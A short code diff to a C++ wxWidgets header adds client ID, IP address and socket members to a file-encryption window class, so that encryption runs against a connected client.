@@ -5,7 +5,7 @@
 
 class frameEncryption : public wxFrame {
 	public:
-		frameEncryption(wxWindow* pParent, std::string strPath);
+		frameEncryption(wxWindow* pParent, std::string _strPath, std::string _strID, std::string _strIP, SOCKET _sck);
 
 		void OnGenerarPass(wxCommandEvent& event);
 		void OnExecCrypt(wxCommandEvent& event);
@@ -13,6 +13,9 @@ class frameEncryption : public wxFrame {
 		
 	private:
 		std::string p_strPath = "";
+		std::string strID     = "";
+		std::string strIP     = "";
+		SOCKET sckCliente = INVALID_SOCKET;
 		wxTextCtrl* txt_Pass = nullptr;
 		wxRadioBox* rdio_Options = nullptr;
 		wxCheckBox* chk_del = nullptr;
